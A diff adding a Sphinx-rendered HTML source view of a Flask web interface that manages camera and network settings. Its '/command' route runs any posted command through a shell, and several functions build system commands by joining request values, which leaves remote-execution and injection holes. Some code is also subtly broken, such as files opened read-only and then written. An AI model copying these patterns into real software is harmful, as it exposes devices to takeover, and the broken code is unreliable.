+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;server&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;server&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;timestamp&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;replace&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;replace&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;interval&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;timelapse&#39;</span><span class="p">,</span> <span class="s1">&#39;interval&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;starttime&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;timelapse&#39;</span><span class="p">,</span> <span class="s1">&#39;starttime&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;stoptime&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;timelapse&#39;</span><span class="p">,</span> <span class="s1">&#39;stoptime&#39;</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">tf</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;True&quot;</span><span class="p">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s2">&quot;False&quot;</span><span class="p">:</span> <span class="s2">&quot;off&quot;</span><span class="p">}</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">:</span>
+        <span class="n">config</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">m_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+            <span class="n">m_id</span> <span class="o">=</span> <span class="n">m_id</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">m_id</span> <span class="o">==</span> <span class="n">serialnumber</span><span class="p">:</span>
+            <span class="c1"># modify picam file if machine id is the sn</span>
+            <span class="n">config_path</span> <span class="o">=</span> <span class="s2">&quot;picam.ini&quot;</span>
+            <span class="n">config</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">config_path</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">items</span><span class="p">(</span><span class="n">multi</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">tf</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                    <span class="c1"># parse datetimes correctly, because they are gonna be messy.</span>
+                    <span class="k">if</span> <span class="n">value</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&quot;starttime&quot;</span><span class="p">,</span> <span class="s2">&quot;stoptime&quot;</span><span class="p">]:</span>
+                        <span class="n">dt</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2">T%H:%M:%S.Z&quot;</span><span class="p">)</span>
+                        <span class="n">value</span> <span class="o">=</span> <span class="n">dt</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%H:%M&#39;</span><span class="p">)</span>
+                    <span class="n">value</span> <span class="o">=</span> <span class="n">tf</span><span class="p">[</span><span class="n">value</span><span class="p">]</span>
+                <span class="n">config</span><span class="p">[</span><span class="n">config_map</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]][</span><span class="n">config_map</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">1</span><span class="p">]]</span> <span class="o">=</span> <span class="n">value</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">sanitizeconfig</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="n">config_path</span><span class="p">)</span>
+                <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">200</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">500</span>
+
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="n">serialnumber</span> <span class="o">+</span> <span class="s2">&quot;.ini&quot;</span><span class="p">)):</span>
+            <span class="c1"># modify camera by serial if available, otherwise 404.</span>
+            <span class="n">config_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="n">serialnumber</span> <span class="o">+</span> <span class="s2">&quot;.ini&quot;</span><span class="p">)</span>
+            <span class="n">config</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">config_path</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">items</span><span class="p">(</span><span class="n">multi</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">tf</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                    <span class="n">value</span> <span class="o">=</span> <span class="n">tf</span><span class="p">[</span><span class="n">value</span><span class="p">]</span>
+                <span class="n">config</span><span class="p">[</span><span class="n">config_map</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]][</span><span class="n">config_map</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">1</span><span class="p">]]</span> <span class="o">=</span> <span class="n">value</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">sanitizeconfig</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="n">config_path</span><span class="p">)</span>
+                <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">200</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">500</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">404</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="mi">405</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/fix_configs&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="fix_confs"><a class="viewcode-back" href="../webinterface.html#webinterface.fix_confs">[docs]</a><span class="k">def</span> <span class="nf">fix_confs</span><span class="p">():</span>
+    <span class="n">configs</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">default</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+    <span class="n">default</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;example.ini&quot;</span><span class="p">)</span>
+    <span class="n">defaultsections</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">default</span><span class="o">.</span><span class="n">sections</span><span class="p">())</span>
+    <span class="n">confs</span> <span class="o">=</span> <span class="n">glob</span><span class="p">(</span><span class="s2">&quot;configs_byserial/*.ini&quot;</span><span class="p">)</span>
+    <span class="n">returnvalues</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">confs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;picam.ini&quot;</span><span class="p">)</span>
+    <span class="n">confs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;eyepi.ini&quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">conff</span> <span class="ow">in</span> <span class="n">confs</span><span class="p">:</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">conff</span><span class="p">]</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">conff</span><span class="p">]</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">conff</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">path</span><span class="p">,</span> <span class="n">config</span> <span class="ow">in</span> <span class="n">configs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+        <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="nb">set</span><span class="p">(</span><span class="n">configs</span><span class="p">[</span><span class="n">conff</span><span class="p">]</span><span class="o">.</span><span class="n">sections</span><span class="p">())</span> <span class="o">-</span> <span class="n">defaultsections</span><span class="p">:</span>
+            <span class="n">a</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">remove_section</span><span class="p">(</span><span class="n">section</span><span class="p">)</span>
+            <span class="n">returnvalues</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">section</span> <span class="o">+</span> <span class="s2">&quot;?&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">conff</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">configfile</span><span class="p">:</span>
+            <span class="n">config</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">configfile</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">a</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/command&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="run_command"><a class="viewcode-back" href="../webinterface.html#webinterface.run_command">[docs]</a><span class="k">def</span> <span class="nf">run_command</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        accepts arbitrary commands as post, and only post</span>
+<span class="sd">        accepts as command1:argument1 argument2, command2: argument1 argument2 ...</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">command</span><span class="p">,</span> <span class="n">argument</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">command</span><span class="p">,</span> <span class="n">argument</span><span class="p">])],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span>
+                                            <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+                <span class="n">response</span><span class="p">[</span><span class="n">command</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="n">response</span><span class="p">[</span><span class="n">command</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+                <span class="n">response</span><span class="p">[</span><span class="n">command</span><span class="p">][</span><span class="s1">&#39;exc&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="s2">&quot;output&quot;</span><span class="p">):</span>
+                    <span class="n">response</span><span class="p">[</span><span class="n">command</span><span class="p">][</span><span class="s1">&#39;out&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">response</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/reset_machine_id&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="reset_machine_id"><a class="viewcode-back" href="../webinterface.html#webinterface.reset_machine_id">[docs]</a><span class="k">def</span> <span class="nf">reset_machine_id</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">        removes the machine id and calls the command to reset machine-id</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Resetting machine ID&quot;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">):</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemd-machine-id-setup&quot;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;ERR&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/net&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="network"><a class="viewcode-back" href="../webinterface.html#webinterface.network">[docs]</a><span class="k">def</span> <span class="nf">network</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    render page for network</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;network.html&quot;</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="trunc_at"><a class="viewcode-back" href="../webinterface.html#webinterface.trunc_at">[docs]</a><span class="k">def</span> <span class="nf">trunc_at</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="s2">&quot;Returns s truncated at the n&#39;th occurrence of the delimiter, d.&quot;</span>
+    <span class="k">return</span> <span class="n">d</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">d</span><span class="p">)[:</span><span class="n">n</span><span class="p">])</span></div>
+
+
+<div class="viewcode-block" id="get_net_size"><a class="viewcode-back" href="../webinterface.html#webinterface.get_net_size">[docs]</a><span class="k">def</span> <span class="nf">get_net_size</span><span class="p">(</span><span class="n">netmask</span><span class="p">):</span>
+    <span class="n">binary_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">octet</span> <span class="ow">in</span> <span class="n">netmask</span><span class="p">:</span>
+        <span class="n">binary_str</span> <span class="o">+=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">octet</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">binary_str</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)))</span></div>
+
+
+<div class="viewcode-block" id="commit_ip"><a class="viewcode-back" href="../webinterface.html#webinterface.commit_ip">[docs]</a><span class="k">def</span> <span class="nf">commit_ip</span><span class="p">(</span><span class="n">ipaddress</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">subnet</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">gateway</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">dev</span><span class="o">=</span><span class="s2">&quot;eth0&quot;</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    commits an ip to the current system</span>
+<span class="sd">    TODO: more platform independend solution</span>
+<span class="sd">    :param ipaddress:</span>
+<span class="sd">    :param subnet:</span>
+<span class="sd">    :param gateway:</span>
+<span class="sd">    :param dev:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">ipaddress</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">subnet</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">gateway</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">dev</span> <span class="o">=</span> <span class="s2">&quot;eth0&quot;</span>
+
+        <span class="n">broadcast</span> <span class="o">=</span> <span class="n">trunc_at</span><span class="p">(</span><span class="n">ipaddress</span><span class="p">,</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;.255&quot;</span>
+        <span class="n">netmask</span> <span class="o">=</span> <span class="n">get_net_size</span><span class="p">(</span><span class="n">subnet</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&quot;/etc/conf.d/&quot;</span><span class="p">):</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="s2">&quot;/etc/conf.d/&quot;</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/conf.d/net-conf-&quot;</span> <span class="o">+</span> <span class="n">dev</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span>
+                <span class="s2">&quot;address=&quot;</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">netmask=&quot;</span> <span class="o">+</span> <span class="n">netmask</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">broadcast=&quot;</span> <span class="o">+</span> <span class="n">broadcast</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">gateway=&quot;</span> <span class="o">+</span> <span class="n">gateway</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/usr/local/bin/net-up.sh&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">script</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;#!/bin/bash</span>
+<span class="s2">						ip link set dev &quot;$1&quot; up</span>
+<span class="s2">						ip addr add $</span><span class="si">{address}</span><span class="s2">/$</span><span class="si">{netmask}</span><span class="s2"> broadcast $</span><span class="si">{broadcast}</span><span class="s2"> dev &quot;$1&quot;</span>
+<span class="s2">						[[ -z $</span><span class="si">{gateway}</span><span class="s2"> ]] || {</span>
+<span class="s2">						  ip route add default via $</span><span class="si">{gateway}</span><span class="s2"></span>
+<span class="s2">						}</span>
+<span class="s2">					&quot;&quot;&quot;</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/usr/local/bin/net-down.sh&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">script</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;#!/bin/bash</span>
+<span class="s2">						ip addr flush dev &quot;$1&quot;</span>
+<span class="s2">						ip route flush dev &quot;$1&quot;</span>
+<span class="s2">						ip link set dev &quot;$1&quot; down</span>
+<span class="s2">					&quot;&quot;&quot;</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chmod +x /usr/local/bin/net-{up,down}.sh&quot;</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/systemd/system/network@.service&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">script</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;[Unit]</span>
+<span class="s2">						Description=Network connectivity (</span><span class="si">%i</span><span class="s2">)</span>
+<span class="s2">						Wants=network.target</span>
+<span class="s2">						Before=network.target</span>
+<span class="s2">						BindsTo=sys-subsystem-net-devices-</span><span class="si">%i</span><span class="s2">.device</span>
+<span class="s2">						After=sys-subsystem-net-devices-</span><span class="si">%i</span><span class="s2">.device</span>
+
+<span class="s2">						[Service]</span>
+<span class="s2">						Type=oneshot</span>
+<span class="s2">						RemainAfterExit=yes</span>
+<span class="s2">						EnvironmentFile=/etc/conf.d/net-conf-</span><span class="si">%i</span><span class="s2"></span>
+<span class="s2">						ExecStart=/usr/local/bin/net-up.sh </span><span class="si">%i</span><span class="s2"></span>
+<span class="s2">						ExecStop=/usr/local/bin/net-down.sh </span><span class="si">%i</span><span class="s2"></span>
+
+<span class="s2">						[Install]</span>
+<span class="s2">						WantedBy=multi-user.target</span>
+<span class="s2">					&quot;&quot;&quot;</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl enable network@&quot;</span> <span class="o">+</span> <span class="n">dev</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="make_dynamic"><a class="viewcode-back" href="../webinterface.html#webinterface.make_dynamic">[docs]</a><span class="k">def</span> <span class="nf">make_dynamic</span><span class="p">(</span><span class="n">dev</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl disable network@&quot;</span> <span class="o">+</span> <span class="n">dev</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="set_ip"><a class="viewcode-back" href="../webinterface.html#webinterface.set_ip">[docs]</a><span class="k">def</span> <span class="nf">set_ip</span><span class="p">(</span><span class="n">ipaddress</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">subnet</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">gateway</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">dev</span><span class="o">=</span><span class="s2">&quot;eth0&quot;</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">ipaddress</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">subnet</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">gateway</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;ip addr add &quot;</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="n">get_net_size</span><span class="p">(</span><span class="n">subnet</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; broadcast &quot;</span> <span class="o">+</span> <span class="n">trunc_at</span><span class="p">(</span><span class="n">ipaddress</span><span class="p">,</span>
+                                                                                                     <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;.255 dev &quot;</span> <span class="o">+</span> <span class="n">dev</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;ip route add default via &quot;</span> <span class="o">+</span> <span class="n">gateway</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">make_dynamic</span><span class="p">(</span><span class="n">dev</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/set-ip&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="set_ips"><a class="viewcode-back" href="../webinterface.html#webinterface.set_ips">[docs]</a><span class="k">def</span> <span class="nf">set_ips</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s2">&quot;ip-form-dynamic&quot;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;ip-form-dynamic&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">:</span>
+                    <span class="n">set_ip</span><span class="p">()</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-ipaddress&quot;</span><span class="p">])</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-subnet&quot;</span><span class="p">])</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-gateway&quot;</span><span class="p">])</span>
+
+                    <span class="n">commit_ip</span><span class="p">(</span><span class="n">ipaddress</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-ipaddress&quot;</span><span class="p">],</span>
+                              <span class="n">subnet</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-subnet&quot;</span><span class="p">],</span>
+                              <span class="n">gateway</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-gateway&quot;</span><span class="p">])</span>
+                    <span class="k">return</span> <span class="s1">&#39;success&#39;</span>
+                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
